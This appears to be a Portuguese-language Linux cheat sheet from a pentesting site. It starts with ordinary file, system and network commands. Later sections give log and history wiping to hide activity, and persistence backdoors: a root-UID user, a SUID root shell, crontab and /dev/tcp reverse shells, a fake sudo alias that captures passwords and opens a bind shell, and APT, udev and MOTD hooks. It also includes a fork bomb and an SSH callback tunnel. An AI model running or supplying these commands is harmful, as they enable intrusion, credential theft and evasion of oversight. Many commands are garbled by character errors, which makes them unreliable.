---
title: "Linux Cheat Sheet"
permalink: /ct/linux-cs/
layout: archive
author_profile: true
---

## Comandos de Arquivos

Compara arquivos

```shell
diff filel file2
```

Força o delete de um diretório

```
rm -rf dir
```

Sobrescreve/apaga um arquivo

```
shred -f -u file
```

Deixa o horário de modificação do arquivo igual ao do arquivo de referência

```
touch -r ref_file file
```

Seta a hora do arquivo

```
touch -t YYYY11t1DDHHSS file
```

Lista os drives conectados

```
sudo fdisk -1
```

Monta uma chave USB

```
mount /dev/sda# /mnt/usbkey
```

Cria uma md5hash do arquivo

```
md5sum -t file
```

Gera uma md5hash

```
echo -n "str" | md5sum
```

Hash SHA1 do arquivo

```
sha1sum file
```

Mostra linhas unicas

```
sort -u
```

Quantidade de com "str" no arquivo

```
grep -c "str" file
```

Cria um .tar com os arquivos

```
tar cf file.tar files
```

Extrai um .ter

```
tar xf file.tar
```

Cria um .tar.gz

```
tar czf file.tar.gz files
```

Extrai um .tar.gz

```
tar xzf file.tar.gz
```

Cria um .tar.bz2

```
tar cjf file.tar.bz2 files
```

Extrai um .tar.bz2

```
tar xjf file.tar.bz2
```

Comprimi/renomeia o arquivo

```
gzip file
```

Descomprime um arquivo .gz

```
gzip -d file. gz
```

UPX packs orig.exe

```
upx -9 -o out.exe orig.exe
```

Cria um ZIP

```
zip -r zipname.zip \Directory\*
```

Corta um bloco de 1k-3k de um arquivo

```
dd skip=lOOO count=2000 bs=S if=file of=file
```

Divide um arquivo em partes de 9k

```
split -b 9K \ file prefix
```

Arquivo de texto compativel com win

```
awk 'sub("$"."\r")' unix.txt win.txt
```

Enconrar arquivos PDF

```
find -i -name file -type '.pdf
```

Procurar por arquivos com setuid

```
find / -perm -4000 -o -perm -2000 -exec ls -ldb {} \;
```

```
find / -perm -u=s -type f 2>/dev/null
```

Converte para formato \*nix

```
dos2unix file
```

Tipo do arquivo

```
file file
```

Seta ou nao o bit imutavel

```
chattr (+/-)i file
```
## Informações do Sistema

Tras o hostname do IP

```
nbtstat -A ip
```

Username atual

```
id 
```

Usuários logados

```
w 
```

Informações do usuário

```
who -a 
```

Último usuário logado

```
last -a 
```

Lista Processos

```
ps -ef 
```

Espaço de disco usado

```
df -h 
```

Versão do kernel / Info CPU

```
uname -a 
```

Sistema de arquivos montado

```
mount 
```

Mostra a lista de usuários

```
getent passwd 
```

Adiciona uma variável no PATH

```
PATH=$PATH:/home/mypath
```

Mata o processo com esse pid

```
kill pid 
```

Mostra informações do OS

```
cat /etc/issue 
```

Mostra informações da versão do OS

```
cat /etc/'release' 
```

Mostra informações do kernel

```
cat /proc/version 
```

Instala pacotes (RedHat)

```
rpm --query -all 
```

Instala RPM (-e=remove)

```
rpm -ivh *.rpm 
```

Pacotes Instalados (Ubuntu)

```
dpkg -get-selections 
```

Instalador DEB (-r=remove)

```
dpkg -I *.deb 
```

Pacotes Instalados (Solaris)

```
pkginfo 
```

Mostra a localização do executável

```
which tscsh/csh/ksh/bash 
```

Disabilita o shell e força o bash

```
chmod 750 tcsh/csh/ksh
```
## Comandos de Rede

Conexões de rede

```
watch ss -tp
```

Conexões TCP -anu=UDP

```
netstat -ant
```

Conexões com PID

```
netstat -tulpn
```

Conexões estabelecidas

```
lsof -i 
```

Acesso a Windows SMB Share

```
smb:// ip /share 
```

Mount Windows Share

```
share user x.x.x.x c$ 
```

Conectar SMB

```
smbclient -0 user\\\\ ip \\ share 
```

Setar IP e Netmask

```
ifconfig eth# ip / cidr 
```

Setar Interface Virtual

```
ifconfig ethO:1 ip / cidr 
```

Setar GW

```
route add default gw gw lp 
```

Mudar o tamanho do MTU

```
ifconfig eth# mtu [size] 
```

Mudar MAC

```
export MAC=xx:xx:xx:xx:xx:xx 
```
```
ifconfig int hw ether MAC
```
```
macchanger -m MAC int 
```

Scan WI-FI

```
iwlist int scan 
```

Domain lookup por IP

```
dig -x ip 
```
```
host ip 
```

Domain SRV lookup

```
host -t SRV _ service _ tcp.url.com 
```

DNS Zone Xfer

```
dig @ ip domain -t AXFR 
```
```
host -l domain namesvr 
```

Mostra chaves de VPN existentes

```
ip xfrm state list 
```

Adiciona Interfaces "Ocultas"

```
ip addr add ip I cidr aev eth0 
```

Lista atributos DHCP

```
/var/log/messages | grep DHCP 
```

Bloqueia IP:Port

```
tcpkill host ip and port port 
```

Habilita IP Forwarding

```
echo "1" /proc/sys/net/ipv4/ip forward 
```

Adiciona Servidor DNS

```
echo '' nameserver x.x.x.x'' /etc/resolv.conf
```
## Encobrir Rastros

Limpar arquivo auth.log

```
echo "" /var/log/auth.log
```

Limpar o histórico do bash do usuário atual

```
echo "" ~/.bash_history
```

Apaga o arquivo bash_history

```
rm ~/.bash_history -rf
```

Limpa o histórico da sessão atual

```
history -c
```

Seta o número máximo de linhas do histórico para 0

```
export HISTFILESIZE=O
```

Seta o número máximo de comandos do histórico para 0

```
export HISTSIZE=O
```

Desabilita o histórico de loggin (É preciso fazer logout para funcionar)

```
unset HISTFILE
```

Mata a sessão atual

```
kill -9 $$
```

Envia permanentemente todo o histórico de comando do bash para /dev/null

```
ln /dev/null ~/.bash_history -sf
```
## Comandos Úteis


Baixa o conteúdo de uma url

```
wget http:// url -0 url.txt -o /dev/null 
```

Remote Desktop para o IP

```
rdesktop ip 
```

Put um arquivo

```
scp /tmp/file user@x.x.x.x:/tmp/file 
```

Get um arquivo

```
scp user@ remoteip :/tmp/file /tmp/file 
```

Adiciona um usuário

```
useradd -m user 
```

Muda a senha do usuário

```
passwd user 
```

Remove um usuário

```
rmuser unarne 
```

Grava o shell  (Ctrl+D para parar)

```
script -a outfile 
```

Encontrar comandos relacionados

```
apropos subject 
```

Ver histórico de comandos do usuário

```
history
```

## Persistência 


Basic reverse shell 
```
ncat --udp -lvp 4242 
ncat --sctp -lvp 4242 
ncat --tcp -lvp 4242 
```

Add a root user 
```
sudo useradd -ou 0 -g 0 john 
sudo passwd john 
echo "linuxpassword" | passwd --stdin john 
```

Suid Binary 
```
TMPDIR2="/var/tmp" 
echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > 
$TMPDIR2/croissant.c 
gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null 
rm $TMPDIR2/croissant.c 
chown root:root $TMPDIR2/croissant 
chmod 4777 $TMPDIR2/croissant 
```

Crontab - Reverse shell
```
(crontab -l ; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash")|crontab 2> /dev/null 
```

Backdooring a user's bash_rc 
(FR/EN Version) 
```
TMPNAME2=".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.serviceIgCBE0" 
cat << EOF > /tmp/$TMPNAME2 
	alias sudo='locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \$locale = "en" ]; then echo -n "[sudo] password for \$USER: ";fi;if [ \$locale = "fr" ]; then echo -n "[sudo] Mot de passe de \$USER: ";fi;read -s pwd;echo; unalias sudo; echo "\$pwd" | /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash > /dev/null && /usr/bin/sudo -S ' 
EOF 
if [ -f ~/.bashrc ]; then 
	cat /tmp/$TMPNAME2 >> ~/.bashrc 
fi 
if [ -f ~/.zshrc ]; then 
	cat /tmp/$TMPNAME2 >> ~/.zshrc 
fi 
rm /tmp/$TMPNAME2 
```
or add the following line inside its .bashrc file. 
```
$ chmod u+x ~/.hidden/fakesudo 
$ echo "alias sudo=~/.hidden/fakesudo" >> ~/.bashrc 
```
and create the fakesudo script. 
```
read -sp "[sudo] password for $USER: " sudopass 
echo "" 
sleep 2 
echo "Sorry, try again." 
echo $sudopass >> /tmp/pass.txt 

/usr/bin/sudo $@ 
```

Backdooring a startup service 
Edit /etc/network/if-up.d/upstart file 
```
RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null" 
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart 
```

Backdooring Message of the Day 
Edit /etc/update-motd.d/00-header file 
```
echo 'bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"' >> /etc/updatemotd.d/00-header 
```

Backdooring a user startup file 
Linux, write a file in ~/.config/autostart/NAME_OF_FILE.desktop 
```
In : ~/.config/autostart/*.desktop 

[Desktop Entry] 
Type=Application 
Name=Welcome 
Exec=/var/lib/gnome-welcome-tour 
AutostartCondition=unless-exists ~/.cache/gnome-getting-started-docs/seen-gettingstarted-guide 
OnlyShowIn=GNOME; 
X-GNOME-Autostart-enabled=false 
```

Backdooring a driver
```
echo "ACTION==\"add\",ENV{DEVTYPE}==\"usb_device\",SUBSYSTEM==\"usb\",RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null 
```

Backdooring the APT 
If you can create a file on the apt.conf.d directory with: APT::Update::Pre-Invoke {"CMD"}; Next time "apt-get update" is done, your CMD will be executed! 
```
echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor 
```

Backdooring the SSH

Add an ssh key into the ~/.ssh folder. 
	1. ssh-keygen 
	2. write the content of ~/.ssh/id_rsa.pub into ~/.ssh/authorized_keys 
	3. set the right permission, 700 for ~/.ssh and 600 for authorized_keys 

## Scripts


PING SWEEP

```
for x in {1..254..1};do ping -c 1 1.1.1.$x | grep "64 b" | cut -d" "-f4 ips.txt; done
```

AUTOMATED DOMAIN NAME RESOLVE

```
#!/bin/bash 
echo "Enter Class C Range: i.e. 192.168.3" 
read range 
for ip in {1 .. 254 .. l};do 
host $range.$ip | grep "name pointer" | cut -d" " -f5 
done
```

FORK BOMB
(Cria Processos até o sistema travar)

```
:(){:|:&};:
```

DNS REVERSE LOOKUP

```
for ip in {1 .. 254 .. 1}; do dig -x 1.1.1.$ip | grep $ip dns.txt; done;
```

IP BANNING

```
#!/bin/sh
#Este script bane qualquer IP na sub-rede /24 para 192.168.1.0 começando em 2
#Ele assume que 1 é o roteador e não proíbe IPs .20, .21, .22
i=2
while [ $i -le 253 ]
do
	if [ $i -ne 20 -a $i -ne 21 -a $i -ne 22 ]; then
		echo "BANNED: arp -s 192.168.1.$i"
		arp -s 192.168.1.$i OO:OO:OO:OO:OO:Oa
	else
		echo "IP NOT BANNED: 192.168.1.$i "
		echo ""
	fi
	i=`expr $i +1`
done 
```

SSH CALLBACK
(Configurar script no crontab para fazer um callback a cada x minutos)

```
#!/bin/sh
killall ssh /dev/null 2 &1
sleep 5
REMLIS=4040
REMUSR=user
HOSTS="domain1.com domain2.com domain3.com"
for LIVEHOST in $HOSTS;
do
	COUNT=$(ping -c2 $LIVEHOST | grep 'received' | awk -F',' '{ print $2 }' | awk '{ print $1}')
	if [[ $COUNt -gt 0 ]] ; then
		ssh -R ${REMLIS}:localhost:22 -i "/home/${REMUSR}/.ssh/id_rsa" -N ${LIVEHOST} -l ${REMUSR}
	fi
```

